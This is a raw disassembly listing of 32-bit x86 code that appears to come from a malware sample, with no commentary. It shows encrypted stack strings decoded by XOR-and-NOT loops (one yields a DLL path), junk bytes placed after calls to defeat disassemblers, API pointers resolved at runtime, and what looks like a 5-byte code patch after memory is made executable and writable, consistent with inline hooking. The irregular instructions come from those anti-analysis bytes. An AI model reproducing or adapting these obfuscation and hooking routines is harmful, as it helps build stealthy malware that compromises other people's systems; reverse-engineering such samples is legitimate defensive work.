 1004e87:	c6 85 e2 f8 ff ff 49 	movb   $0x49,-0x71e(%ebp)
 1004e8e:	c6 85 e3 f8 ff ff 58 	movb   $0x58,-0x71d(%ebp)
 1004e95:	c6 85 e4 f8 ff ff 5e 	movb   $0x5e,-0x71c(%ebp)
 1004e9c:	c6 85 e5 f8 ff ff 49 	movb   $0x49,-0x71b(%ebp)
 1004ea3:	c6 85 e6 f8 ff ff 3d 	movb   $0x3d,-0x71a(%ebp)
 1004eaa:	e8 17 eb ff ff       	call   0x10039c6
 1004eaf:	c0 27 74             	shlb   $0x74,(%edi)
 1004eb2:	76 8d                	jbe    0x1004e41
 1004eb4:	85 d4                	test   %edx,%esp
 1004eb6:	f8                   	clc
 1004eb7:	ff                   	(bad)
 1004eb8:	ff 50 e8             	call   *-0x18(%eax)
 1004ebb:	17                   	pop    %ss
 1004ebc:	eb ff                	jmp    0x1004ebd
 1004ebe:	ff 59 50             	lcall  *0x50(%ecx)
 1004ec1:	ff 75 18             	push   0x18(%ebp)
 1004ec4:	ff 75 14             	push   0x14(%ebp)
 1004ec7:	e8 bf ea ff ff       	call   0x100398b
 1004ecc:	83 c4 0c             	add    $0xc,%esp
 1004ecf:	89 85 1c f9 ff ff    	mov    %eax,-0x6e4(%ebp)
 1004ed5:	e8 ec ea ff ff       	call   0x10039c6
 1004eda:	a9 c6 73 26 8d       	test   $0x8d2673c6,%eax
 1004edf:	85 e8                	test   %ebp,%eax
 1004ee1:	f8                   	clc
 1004ee2:	ff                   	(bad)
 1004ee3:	ff 50 6a             	call   *0x6a(%eax)
 1004ee6:	40                   	inc    %eax
 1004ee7:	6a 05                	push   $0x5
 1004ee9:	ff b5 58 fc ff ff    	push   -0x3a8(%ebp)
 1004eef:	ff 95 1c f9 ff ff    	call   *-0x6e4(%ebp)
 1004ef5:	6a 05                	push   $0x5
 1004ef7:	8d 85 6c fc ff ff    	lea    -0x394(%ebp),%eax
 1004efd:	50                   	push   %eax
 1004efe:	ff b5 58 fc ff ff    	push   -0x3a8(%ebp)
 1004f04:	e8 2e ea ff ff       	call   0x1003937
 1004f09:	83 c4 0c             	add    $0xc,%esp
 1004f0c:	8d 85 e8 f8 ff ff    	lea    -0x718(%ebp),%eax
 1004f12:	50                   	push   %eax
 1004f13:	ff b5 e8 f8 ff ff    	push   -0x718(%ebp)
 1004f19:	6a 05                	push   $0x5
 1004f1b:	ff b5 58 fc ff ff    	push   -0x3a8(%ebp)
 1004f21:	ff 95 1c f9 ff ff    	call   *-0x6e4(%ebp)
 1004f27:	e8 9a ea ff ff       	call   0x10039c6
 1004f2c:	45                   	inc    %ebp
 1004f2d:	d5 69                	aad    $0x69
 1004f2f:	72 83                	jb     0x1004eb4
 1004f31:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1004f32:	00 f9                	add    %bh,%cl
 1004f34:	ff                   	(bad)
 1004f35:	ff 00                	incl   (%eax)
 1004f37:	eb 0d                	jmp    0x1004f46
 1004f39:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1004f3f:	40                   	inc    %eax
 1004f40:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
 1004f46:	83 bd 00 f9 ff ff 05 	cmpl   $0x5,-0x700(%ebp)
 1004f4d:	7d 10                	jge    0x1004f5f
 1004f4f:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1004f55:	80 a4 05 6c fc ff ff 	andb   $0x0,-0x394(%ebp,%eax,1)
 1004f5c:	00 
 1004f5d:	eb da                	jmp    0x1004f39
 1004f5f:	6a 04                	push   $0x4
 1004f61:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
 1004f67:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1004f6a:	8d 44 01 e8          	lea    -0x18(%ecx,%eax,1),%eax
 1004f6e:	50                   	push   %eax
 1004f6f:	8d 85 c0 fa ff ff    	lea    -0x540(%ebp),%eax
 1004f75:	50                   	push   %eax
 1004f76:	e8 bc e9 ff ff       	call   0x1003937
 1004f7b:	83 c4 0c             	add    $0xc,%esp
 1004f7e:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
 1004f82:	8b 8d c0 fa ff ff    	mov    -0x540(%ebp),%ecx
 1004f88:	2b c8                	sub    %eax,%ecx
 1004f8a:	89 8d c0 fa ff ff    	mov    %ecx,-0x540(%ebp)
 1004f90:	6a 04                	push   $0x4
 1004f92:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
 1004f98:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1004f9b:	8d 44 01 ec          	lea    -0x14(%ecx,%eax,1),%eax
 1004f9f:	50                   	push   %eax
 1004fa0:	8d 45 f4             	lea    -0xc(%ebp),%eax
 1004fa3:	50                   	push   %eax
 1004fa4:	e8 8e e9 ff ff       	call   0x1003937
 1004fa9:	83 c4 0c             	add    $0xc,%esp
 1004fac:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
 1004fb0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
 1004fb3:	2b c8                	sub    %eax,%ecx
 1004fb5:	89 4d f4             	mov    %ecx,-0xc(%ebp)
 1004fb8:	6a 04                	push   $0x4
 1004fba:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
 1004fc0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1004fc3:	8d 44 01 f0          	lea    -0x10(%ecx,%eax,1),%eax
 1004fc7:	50                   	push   %eax
 1004fc8:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
 1004fce:	50                   	push   %eax
 1004fcf:	e8 63 e9 ff ff       	call   0x1003937
 1004fd4:	83 c4 0c             	add    $0xc,%esp
 1004fd7:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
 1004fdb:	8b 8d 00 fc ff ff    	mov    -0x400(%ebp),%ecx
 1004fe1:	2b c8                	sub    %eax,%ecx
 1004fe3:	89 8d 00 fc ff ff    	mov    %ecx,-0x400(%ebp)
 1004fe9:	e8 d8 e9 ff ff       	call   0x10039c6
 1004fee:	0c d6                	or     $0xd6,%al
 1004ff0:	d5 0e                	aad    $0xe
 1004ff2:	6a 04                	push   $0x4
 1004ff4:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
 1004ffa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1004ffd:	8d 44 01 f4          	lea    -0xc(%ecx,%eax,1),%eax
 1005001:	50                   	push   %eax
 1005002:	8d 85 b4 fa ff ff    	lea    -0x54c(%ebp),%eax
 1005008:	50                   	push   %eax
 1005009:	e8 29 e9 ff ff       	call   0x1003937
 100500e:	83 c4 0c             	add    $0xc,%esp
 1005011:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
 1005015:	8b 8d b4 fa ff ff    	mov    -0x54c(%ebp),%ecx
 100501b:	2b c8                	sub    %eax,%ecx
 100501d:	89 8d b4 fa ff ff    	mov    %ecx,-0x54c(%ebp)
 1005023:	e8 9e e9 ff ff       	call   0x10039c6
 1005028:	17                   	pop    %ss
 1005029:	a8 5d                	test   $0x5d,%al
 100502b:	7f 6a                	jg     0x1005097
 100502d:	04 8b                	add    $0x8b,%al
 100502f:	85 88 fc ff ff 8b    	test   %ecx,-0x74000004(%eax)
 1005035:	4d                   	dec    %ebp
 1005036:	fc                   	cld
 1005037:	8d 44 01 f8          	lea    -0x8(%ecx,%eax,1),%eax
 100503b:	50                   	push   %eax
 100503c:	8d 85 7c f9 ff ff    	lea    -0x684(%ebp),%eax
 1005042:	50                   	push   %eax
 1005043:	e8 ef e8 ff ff       	call   0x1003937
 1005048:	83 c4 0c             	add    $0xc,%esp
 100504b:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
 100504f:	8b 8d 7c f9 ff ff    	mov    -0x684(%ebp),%ecx
 1005055:	2b c8                	sub    %eax,%ecx
 1005057:	89 8d 7c f9 ff ff    	mov    %ecx,-0x684(%ebp)
 100505d:	6a 04                	push   $0x4
 100505f:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
 1005065:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1005068:	8d 44 01 fc          	lea    -0x4(%ecx,%eax,1),%eax
 100506c:	50                   	push   %eax
 100506d:	8d 85 88 f9 ff ff    	lea    -0x678(%ebp),%eax
 1005073:	50                   	push   %eax
 1005074:	e8 be e8 ff ff       	call   0x1003937
 1005079:	83 c4 0c             	add    $0xc,%esp
 100507c:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
 1005080:	8b 8d 88 f9 ff ff    	mov    -0x678(%ebp),%ecx
 1005086:	2b c8                	sub    %eax,%ecx
 1005088:	89 8d 88 f9 ff ff    	mov    %ecx,-0x678(%ebp)
 100508e:	6a 04                	push   $0x4
 1005090:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1005093:	03 85 88 f9 ff ff    	add    -0x678(%ebp),%eax
 1005099:	50                   	push   %eax
 100509a:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
 10050a0:	50                   	push   %eax
 10050a1:	e8 91 e8 ff ff       	call   0x1003937
 10050a6:	83 c4 0c             	add    $0xc,%esp
 10050a9:	8b 85 74 fc ff ff    	mov    -0x38c(%ebp),%eax
 10050af:	8b 8d 88 f9 ff ff    	mov    -0x678(%ebp),%ecx
 10050b5:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
 10050b9:	89 85 54 fc ff ff    	mov    %eax,-0x3ac(%ebp)
 10050bf:	6a 04                	push   $0x4
 10050c1:	8b 45 fc             	mov    -0x4(%ebp),%eax
 10050c4:	03 85 54 fc ff ff    	add    -0x3ac(%ebp),%eax
 10050ca:	50                   	push   %eax
 10050cb:	8d 85 78 f9 ff ff    	lea    -0x688(%ebp),%eax
 10050d1:	50                   	push   %eax
 10050d2:	e8 60 e8 ff ff       	call   0x1003937
 10050d7:	83 c4 0c             	add    $0xc,%esp
 10050da:	8b 85 88 f9 ff ff    	mov    -0x678(%ebp),%eax
 10050e0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10050e3:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
 10050e7:	89 85 b8 f8 ff ff    	mov    %eax,-0x748(%ebp)
 10050ed:	8b 85 54 fc ff ff    	mov    -0x3ac(%ebp),%eax
 10050f3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10050f6:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
 10050fa:	89 85 08 f9 ff ff    	mov    %eax,-0x6f8(%ebp)
 1005100:	83 a5 00 f9 ff ff 00 	andl   $0x0,-0x700(%ebp)
 1005107:	eb 0d                	jmp    0x1005116
 1005109:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 100510f:	40                   	inc    %eax
 1005110:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
 1005116:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 100511c:	3b 85 74 fc ff ff    	cmp    -0x38c(%ebp),%eax
 1005122:	73 44                	jae    0x1005168
 1005124:	8b 85 b8 f8 ff ff    	mov    -0x748(%ebp),%eax
 100512a:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
 1005130:	0f be 00             	movsbl (%eax),%eax
 1005133:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
 1005137:	33 c1                	xor    %ecx,%eax
 1005139:	8b 8d b8 f8 ff ff    	mov    -0x748(%ebp),%ecx
 100513f:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
 1005145:	88 01                	mov    %al,(%ecx)
 1005147:	8b 85 b8 f8 ff ff    	mov    -0x748(%ebp),%eax
 100514d:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
 1005153:	0f be 00             	movsbl (%eax),%eax
 1005156:	f7 d0                	not    %eax
 1005158:	8b 8d b8 f8 ff ff    	mov    -0x748(%ebp),%ecx
 100515e:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
 1005164:	88 01                	mov    %al,(%ecx)
 1005166:	eb a1                	jmp    0x1005109
 1005168:	83 a5 00 f9 ff ff 00 	andl   $0x0,-0x700(%ebp)
 100516f:	eb 0d                	jmp    0x100517e
 1005171:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1005177:	40                   	inc    %eax
 1005178:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
 100517e:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1005184:	3b 85 78 f9 ff ff    	cmp    -0x688(%ebp),%eax
 100518a:	73 44                	jae    0x10051d0
 100518c:	8b 85 08 f9 ff ff    	mov    -0x6f8(%ebp),%eax
 1005192:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
 1005198:	0f be 00             	movsbl (%eax),%eax
 100519b:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
 100519f:	33 c1                	xor    %ecx,%eax
 10051a1:	8b 8d 08 f9 ff ff    	mov    -0x6f8(%ebp),%ecx
 10051a7:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
 10051ad:	88 01                	mov    %al,(%ecx)
 10051af:	8b 85 08 f9 ff ff    	mov    -0x6f8(%ebp),%eax
 10051b5:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
 10051bb:	0f be 00             	movsbl (%eax),%eax
 10051be:	f7 d0                	not    %eax
 10051c0:	8b 8d 08 f9 ff ff    	mov    -0x6f8(%ebp),%ecx
 10051c6:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
 10051cc:	88 01                	mov    %al,(%ecx)
 10051ce:	eb a1                	jmp    0x1005171
 10051d0:	80 a5 ec f8 ff ff 00 	andb   $0x0,-0x714(%ebp)
 10051d7:	80 a5 ed f8 ff ff 00 	andb   $0x0,-0x713(%ebp)
 10051de:	c6 85 ee f8 ff ff 71 	movb   $0x71,-0x712(%ebp)
 10051e5:	80 a5 ef f8 ff ff 00 	andb   $0x0,-0x711(%ebp)
 10051ec:	c6 85 f0 f8 ff ff c8 	movb   $0xc8,-0x710(%ebp)
 10051f3:	c6 85 f1 f8 ff ff e2 	movb   $0xe2,-0x70f(%ebp)
 10051fa:	c6 85 f2 f8 ff ff e1 	movb   $0xe1,-0x70e(%ebp)
 1005201:	c6 85 f3 f8 ff ff e1 	movb   $0xe1,-0x70d(%ebp)
 1005208:	c6 85 f4 f8 ff ff ea 	movb   $0xea,-0x70c(%ebp)
 100520f:	c6 85 f5 f8 ff ff c8 	movb   $0xc8,-0x70b(%ebp)
 1005216:	c6 85 f6 f8 ff ff e7 	movb   $0xe7,-0x70a(%ebp)
 100521d:	c6 85 f7 f8 ff ff f6 	movb   $0xf6,-0x709(%ebp)
 1005224:	c6 85 f8 f8 ff ff bc 	movb   $0xbc,-0x708(%ebp)
 100522b:	c6 85 f9 f8 ff ff 8e 	movb   $0x8e,-0x707(%ebp)
 1005232:	e8 8f e7 ff ff       	call   0x10039c6
 1005237:	aa                   	stos   %al,%es:(%edi)
 1005238:	36 ce                	ss into
 100523a:	ea 80 a5 bc f8 ff ff 	ljmp   $0xffff,$0xf8bca580
 1005241:	00 80 a5 bd f8 ff    	add    %al,-0x7425b(%eax)
 1005247:	ff 00                	incl   (%eax)
 1005249:	c6 85 be f8 ff ff 02 	movb   $0x2,-0x742(%ebp)
 1005250:	80 a5 bf f8 ff ff 00 	andb   $0x0,-0x741(%ebp)
 1005257:	c6 85 c0 f8 ff ff b1 	movb   $0xb1,-0x740(%ebp)
 100525e:	c6 85 c1 f8 ff ff 92 	movb   $0x92,-0x73f(%ebp)
 1005265:	c6 85 c2 f8 ff ff 9c 	movb   $0x9c,-0x73e(%ebp)
 100526c:	c6 85 c3 f8 ff ff 99 	movb   $0x99,-0x73d(%ebp)
 1005273:	c6 85 c4 f8 ff ff b1 	movb   $0xb1,-0x73c(%ebp)
 100527a:	c6 85 c5 f8 ff ff 94 	movb   $0x94,-0x73b(%ebp)
 1005281:	c6 85 c6 f8 ff ff 9f 	movb   $0x9f,-0x73a(%ebp)
 1005288:	c6 85 c7 f8 ff ff 8f 	movb   $0x8f,-0x739(%ebp)
 100528f:	c6 85 c8 f8 ff ff 9c 	movb   $0x9c,-0x738(%ebp)
 1005296:	c6 85 c9 f8 ff ff 8f 	movb   $0x8f,-0x737(%ebp)
 100529d:	c6 85 ca f8 ff ff 84 	movb   $0x84,-0x736(%ebp)
 10052a4:	c6 85 cb f8 ff ff bc 	movb   $0xbc,-0x735(%ebp)
 10052ab:	c6 85 cc f8 ff ff fd 	movb   $0xfd,-0x734(%ebp)
 10052b2:	8d 85 bc f8 ff ff    	lea    -0x744(%ebp),%eax
 10052b8:	50                   	push   %eax
 10052b9:	e8 18 e7 ff ff       	call   0x10039d6
 10052be:	59                   	pop    %ecx
 10052bf:	50                   	push   %eax
 10052c0:	ff 75 18             	push   0x18(%ebp)
 10052c3:	ff 75 14             	push   0x14(%ebp)
 10052c6:	e8 c0 e6 ff ff       	call   0x100398b
 10052cb:	83 c4 0c             	add    $0xc,%esp
 10052ce:	89 85 fc f8 ff ff    	mov    %eax,-0x704(%ebp)
 10052d4:	80 a5 0c f9 ff ff 00 	andb   $0x0,-0x6f4(%ebp)
 10052db:	80 a5 0d f9 ff ff 00 	andb   $0x0,-0x6f3(%ebp)
 10052e2:	c6 85 0e f9 ff ff 43 	movb   $0x43,-0x6f2(%ebp)
 10052e9:	80 a5 0f f9 ff ff 00 	andb   $0x0,-0x6f1(%ebp)
 10052f0:	c6 85 10 f9 ff ff eb 	movb   $0xeb,-0x6f0(%ebp)
 10052f7:	c6 85 11 f9 ff ff ce 	movb   $0xce,-0x6ef(%ebp)
 10052fe:	c6 85 12 f9 ff ff d5 	movb   $0xd5,-0x6ee(%ebp)
 1005305:	c6 85 13 f9 ff ff c8 	movb   $0xc8,-0x6ed(%ebp)
 100530c:	c6 85 14 f9 ff ff d9 	movb   $0xd9,-0x6ec(%ebp)
 1005313:	c6 85 15 f9 ff ff fa 	movb   $0xfa,-0x6eb(%ebp)
 100531a:	c6 85 16 f9 ff ff d5 	movb   $0xd5,-0x6ea(%ebp)
 1005321:	c6 85 17 f9 ff ff d0 	movb   $0xd0,-0x6e9(%ebp)
 1005328:	c6 85 18 f9 ff ff d9 	movb   $0xd9,-0x6e8(%ebp)
 100532f:	c6 85 19 f9 ff ff bc 	movb   $0xbc,-0x6e7(%ebp)
 1005336:	e8 8b e6 ff ff       	call   0x10039c6
 100533b:	e6 bf                	out    %al,$0xbf
 100533d:	59                   	pop    %ecx
 100533e:	42                   	inc    %edx
 100533f:	8d 85 0c f9 ff ff    	lea    -0x6f4(%ebp),%eax
 1005345:	50                   	push   %eax
 1005346:	e8 8b e6 ff ff       	call   0x10039d6
 100534b:	59                   	pop    %ecx
 100534c:	50                   	push   %eax
 100534d:	ff 75 18             	push   0x18(%ebp)
 1005350:	ff 75 14             	push   0x14(%ebp)
 1005353:	e8 33 e6 ff ff       	call   0x100398b
 1005358:	83 c4 0c             	add    $0xc,%esp
 100535b:	89 85 d0 f8 ff ff    	mov    %eax,-0x730(%ebp)
 1005361:	83 a5 04 f9 ff ff 00 	andl   $0x0,-0x6fc(%ebp)
 1005368:	6a 01                	push   $0x1
 100536a:	58                   	pop    %eax
 100536b:	85 c0                	test   %eax,%eax
 100536d:	0f 84 f9 06 00 00    	je     0x1005a6c
 1005373:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
 1005379:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
 100537f:	83 bd 04 f9 ff ff 00 	cmpl   $0x0,-0x6fc(%ebp)
 1005386:	0f 85 b5 01 00 00    	jne    0x1005541
 100538c:	80 a5 84 f8 ff ff 00 	andb   $0x0,-0x77c(%ebp)
 1005393:	80 a5 85 f8 ff ff 00 	andb   $0x0,-0x77b(%ebp)
 100539a:	c6 85 86 f8 ff ff 04 	movb   $0x4,-0x77a(%ebp)
 10053a1:	80 a5 87 f8 ff ff 00 	andb   $0x0,-0x779(%ebp)
 10053a8:	c6 85 88 f8 ff ff b8 	movb   $0xb8,-0x778(%ebp)
 10053af:	c6 85 89 f8 ff ff c1 	movb   $0xc1,-0x777(%ebp)
 10053b6:	c6 85 8a f8 ff ff a7 	movb   $0xa7,-0x776(%ebp)
 10053bd:	c6 85 8b f8 ff ff ab 	movb   $0xab,-0x775(%ebp)
 10053c4:	c6 85 8c f8 ff ff 89 	movb   $0x89,-0x774(%ebp)
 10053cb:	c6 85 8d f8 ff ff 94 	movb   $0x94,-0x773(%ebp)
 10053d2:	c6 85 8e f8 ff ff 9c 	movb   $0x9c,-0x772(%ebp)
 10053d9:	c6 85 8f f8 ff ff 89 	movb   $0x89,-0x771(%ebp)
 10053e0:	c6 85 90 f8 ff ff 9a 	movb   $0x9a,-0x770(%ebp)
 10053e7:	c6 85 91 f8 ff ff 96 	movb   $0x96,-0x76f(%ebp)
 10053ee:	c6 85 92 f8 ff ff db 	movb   $0xdb,-0x76e(%ebp)
 10053f5:	c6 85 93 f8 ff ff bd 	movb   $0xbd,-0x76d(%ebp)
 10053fc:	c6 85 94 f8 ff ff 92 	movb   $0x92,-0x76c(%ebp)
 1005403:	c6 85 95 f8 ff ff 97 	movb   $0x97,-0x76b(%ebp)
 100540a:	c6 85 96 f8 ff ff 9e 	movb   $0x9e,-0x76a(%ebp)
 1005411:	c6 85 97 f8 ff ff 88 	movb   $0x88,-0x769(%ebp)
 1005418:	c6 85 98 f8 ff ff a7 	movb   $0xa7,-0x768(%ebp)
 100541f:	c6 85 99 f8 ff ff b8 	movb   $0xb8,-0x767(%ebp)
 1005426:	c6 85 9a f8 ff ff 94 	movb   $0x94,-0x766(%ebp)
 100542d:	c6 85 9b f8 ff ff 96 	movb   $0x96,-0x765(%ebp)
 1005434:	c6 85 9c f8 ff ff 96 	movb   $0x96,-0x764(%ebp)
 100543b:	c6 85 9d f8 ff ff 94 	movb   $0x94,-0x763(%ebp)
 1005442:	c6 85 9e f8 ff ff 95 	movb   $0x95,-0x762(%ebp)
 1005449:	c6 85 9f f8 ff ff db 	movb   $0xdb,-0x761(%ebp)
 1005450:	c6 85 a0 f8 ff ff bd 	movb   $0xbd,-0x760(%ebp)
 1005457:	c6 85 a1 f8 ff ff 92 	movb   $0x92,-0x75f(%ebp)
 100545e:	c6 85 a2 f8 ff ff 97 	movb   $0x97,-0x75e(%ebp)
 1005465:	c6 85 a3 f8 ff ff 9e 	movb   $0x9e,-0x75d(%ebp)
 100546c:	c6 85 a4 f8 ff ff 88 	movb   $0x88,-0x75c(%ebp)
 1005473:	c6 85 a5 f8 ff ff a7 	movb   $0xa7,-0x75b(%ebp)
 100547a:	c6 85 a6 f8 ff ff a8 	movb   $0xa8,-0x75a(%ebp)
 1005481:	c6 85 a7 f8 ff ff 82 	movb   $0x82,-0x759(%ebp)
 1005488:	c6 85 a8 f8 ff ff 88 	movb   $0x88,-0x758(%ebp)
 100548f:	c6 85 a9 f8 ff ff 8f 	movb   $0x8f,-0x757(%ebp)
 1005496:	c6 85 aa f8 ff ff 9e 	movb   $0x9e,-0x756(%ebp)
 100549d:	c6 85 ab f8 ff ff 96 	movb   $0x96,-0x755(%ebp)
 10054a4:	c6 85 ac f8 ff ff a7 	movb   $0xa7,-0x754(%ebp)
 10054ab:	c6 85 ad f8 ff ff 88 	movb   $0x88,-0x753(%ebp)
 10054b2:	c6 85 ae f8 ff ff 82 	movb   $0x82,-0x752(%ebp)
 10054b9:	c6 85 af f8 ff ff 96 	movb   $0x96,-0x751(%ebp)
 10054c0:	c6 85 b0 f8 ff ff 88 	movb   $0x88,-0x750(%ebp)
 10054c7:	c6 85 b1 f8 ff ff 89 	movb   $0x89,-0x74f(%ebp)
 10054ce:	c6 85 b2 f8 ff ff 8d 	movb   $0x8d,-0x74e(%ebp)
 10054d5:	c6 85 b3 f8 ff ff d5 	movb   $0xd5,-0x74d(%ebp)
 10054dc:	c6 85 b4 f8 ff ff 9f 	movb   $0x9f,-0x74c(%ebp)
 10054e3:	c6 85 b5 f8 ff ff 97 	movb   $0x97,-0x74b(%ebp)
 10054ea:	c6 85 b6 f8 ff ff 97 	movb   $0x97,-0x74a(%ebp)
 10054f1:	c6 85 b7 f8 ff ff fb 	movb   $0xfb,-0x749(%ebp)
 10054f8:	8d 85 84 f8 ff ff    	lea    -0x77c(%ebp),%eax
 10054fe:	50                   	push   %eax
 10054ff:	e8 d2 e4 ff ff       	call   0x10039d6
 1005504:	59                   	pop    %ecx
 1005505:	8a 85 d4 fe ff ff    	mov    -0x12c(%ebp),%al
 100550b:	88 85 88 f8 ff ff    	mov    %al,-0x778(%ebp)
 1005511:	6a 30                	push   $0x30
 1005513:	8d 85 84 f8 ff ff    	lea    -0x77c(%ebp),%eax
 1005519:	50                   	push   %eax
 100551a:	e8 b7 e4 ff ff       	call   0x10039d6
 100551f:	59                   	pop    %ecx
 1005520:	50                   	push   %eax
 1005521:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
 1005527:	50                   	push   %eax
 1005528:	e8 0a e4 ff ff       	call   0x1003937
 100552d:	83 c4 0c             	add    $0xc,%esp
 1005530:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
 1005536:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
 100553c:	e9 fd 03 00 00       	jmp    0x100593e
 1005541:	83 bd 04 f9 ff ff 01 	cmpl   $0x1,-0x6fc(%ebp)
 1005548:	0f 85 a4 00 00 00    	jne    0x10055f2
 100554e:	80 a5 74 f8 ff ff 00 	andb   $0x0,-0x78c(%ebp)
 1005555:	80 a5 75 f8 ff ff 00 	andb   $0x0,-0x78b(%ebp)
 100555c:	c6 85 76 f8 ff ff a0 	movb   $0xa0,-0x78a(%ebp)
 1005563:	80 a5 77 f8 ff ff 00 	andb   $0x0,-0x789(%ebp)
 100556a:	c6 85 78 f8 ff ff 03 	movb   $0x3,-0x788(%ebp)
 1005571:	c6 85 79 f8 ff ff 3b 	movb   $0x3b,-0x787(%ebp)
 1005578:	c6 85 7a f8 ff ff 33 	movb   $0x33,-0x786(%ebp)
 100557f:	c6 85 7b f8 ff ff 3c 	movb   $0x3c,-0x785(%ebp)
 1005586:	c6 85 7c f8 ff ff 30 	movb   $0x30,-0x784(%ebp)
 100558d:	c6 85 7d f8 ff ff 3a 	movb   $0x3a,-0x783(%ebp)
 1005594:	c6 85 7e f8 ff ff 2d 	movb   $0x2d,-0x782(%ebp)
 100559b:	c6 85 7f f8 ff ff 71 	movb   $0x71,-0x781(%ebp)
 10055a2:	c6 85 80 f8 ff ff 3b 	movb   $0x3b,-0x780(%ebp)
 10055a9:	c6 85 81 f8 ff ff 33 	movb   $0x33,-0x77f(%ebp)
 10055b0:	c6 85 82 f8 ff ff 33 	movb   $0x33,-0x77e(%ebp)
 10055b7:	c6 85 83 f8 ff ff 5f 	movb   $0x5f,-0x77d(%ebp)
 10055be:	6a 0c                	push   $0xc
 10055c0:	8d 85 74 f8 ff ff    	lea    -0x78c(%ebp),%eax
 10055c6:	50                   	push   %eax
 10055c7:	e8 0a e4 ff ff       	call   0x10039d6
 10055cc:	59                   	pop    %ecx
 10055cd:	50                   	push   %eax
 10055ce:	8b 45 d8             	mov    -0x28(%ebp),%eax
 10055d1:	8d 84 05 d4 fe ff ff 	lea    -0x12c(%ebp,%eax,1),%eax
 10055d8:	50                   	push   %eax
 10055d9:	e8 59 e3 ff ff       	call   0x1003937
 10055de:	83 c4 0c             	add    $0xc,%esp
 10055e1:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
 10055e7:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
 10055ed:	e9 4c 03 00 00       	jmp    0x100593e
 10055f2:	83 bd 04 f9 ff ff 02 	cmpl   $0x2,-0x6fc(%ebp)
 10055f9:	0f 85 b0 00 00 00    	jne    0x10056af
 10055ff:	80 a5 64 f8 ff ff 00 	andb   $0x0,-0x79c(%ebp)
 1005606:	80 a5 65 f8 ff ff 00 	andb   $0x0,-0x79b(%ebp)
 100560d:	c6 85 66 f8 ff ff 10 	movb   $0x10,-0x79a(%ebp)
 1005614:	80 a5 67 f8 ff ff 00 	andb   $0x0,-0x799(%ebp)
 100561b:	c6 85 68 f8 ff ff b3 	movb   $0xb3,-0x798(%ebp)
 1005622:	c6 85 69 f8 ff ff 8c 	movb   $0x8c,-0x797(%ebp)
 1005629:	c6 85 6a f8 ff ff 80 	movb   $0x80,-0x796(%ebp)
 1005630:	c6 85 6b f8 ff ff 81 	movb   $0x81,-0x795(%ebp)
 1005637:	c6 85 6c f8 ff ff 9d 	movb   $0x9d,-0x794(%ebp)
 100563e:	c6 85 6d f8 ff ff 8a 	movb   $0x8a,-0x793(%ebp)
 1005645:	c6 85 6e f8 ff ff 9c 	movb   $0x9c,-0x792(%ebp)
 100564c:	c6 85 6f f8 ff ff c1 	movb   $0xc1,-0x791(%ebp)
 1005653:	c6 85 70 f8 ff ff 8b 	movb   $0x8b,-0x790(%ebp)
 100565a:	c6 85 71 f8 ff ff 83 	movb   $0x83,-0x78f(%ebp)
 1005661:	c6 85 72 f8 ff ff 83 	movb   $0x83,-0x78e(%ebp)
 1005668:	c6 85 73 f8 ff ff ef 	movb   $0xef,-0x78d(%ebp)
 100566f:	e8 52 e3 ff ff       	call   0x10039c6
 1005674:	c6                   	(bad)
 1005675:	1e                   	push   %ds
 1005676:	46                   	inc    %esi
 1005677:	5a                   	pop    %edx
 1005678:	6a 0c                	push   $0xc
 100567a:	8d 85 64 f8 ff ff    	lea    -0x79c(%ebp),%eax
 1005680:	50                   	push   %eax
 1005681:	e8 50 e3 ff ff       	call   0x10039d6
 1005686:	59                   	pop    %ecx
 1005687:	50                   	push   %eax
